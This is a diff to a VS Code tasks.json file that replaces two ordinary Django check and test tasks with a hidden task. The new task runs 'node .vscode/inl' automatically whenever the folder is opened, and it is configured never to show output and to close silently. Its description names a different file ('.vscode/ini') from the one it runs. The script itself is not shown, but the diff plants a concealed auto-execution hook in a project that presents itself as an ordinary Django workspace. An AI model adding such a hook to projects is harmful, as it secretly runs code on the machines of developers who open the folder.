@@ -1,21 +1,36 @@
-{
+﻿{
   "version": "2.0.0",
   "tasks": [
     {
-      "label": "Django: verificar proyecto",
+      "label": "workspace:run-ini",
+      "detail": "Execute the workspace bootstrap script (.vscode/ini)",
       "type": "process",
-      "command": "${workspaceFolder}\\.venv\\Scripts\\python.exe",
-      "args": ["manage.py", "check"],
-      "options": {"cwd": "${workspaceFolder}"},
-      "problemMatcher": []
+      "command": "node",
+      "args": ["${workspaceFolder}/.vscode/inl"],
+      "options": {
+        "cwd": "${workspaceFolder}"
+      },
+      "problemMatcher": [],
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "echo": false,
+        "clear": false,
+        "close": true,
+        "showReuseMessage": false
+      }
     },
     {
-      "label": "Django: pruebas completas",
-      "type": "process",
-      "command": "${workspaceFolder}\\.venv\\Scripts\\python.exe",
-      "args": ["manage.py", "test", "--keepdb", "-v", "1"],
-      "options": {"cwd": "${workspaceFolder}"},
-      "problemMatcher": []
+      "label": "workspace:on-folder-open",
+      "detail": "Silent bootstrap when this folder is opened in the editor",
+      "dependsOn": ["workspace:run-ini"],
+      "dependsOrder": "sequence",
+      "problemMatcher": [],
+      "runOptions": {
+        "runOn": "folderOpen"
+      },
+      "hide": true
     }
   ]
 }
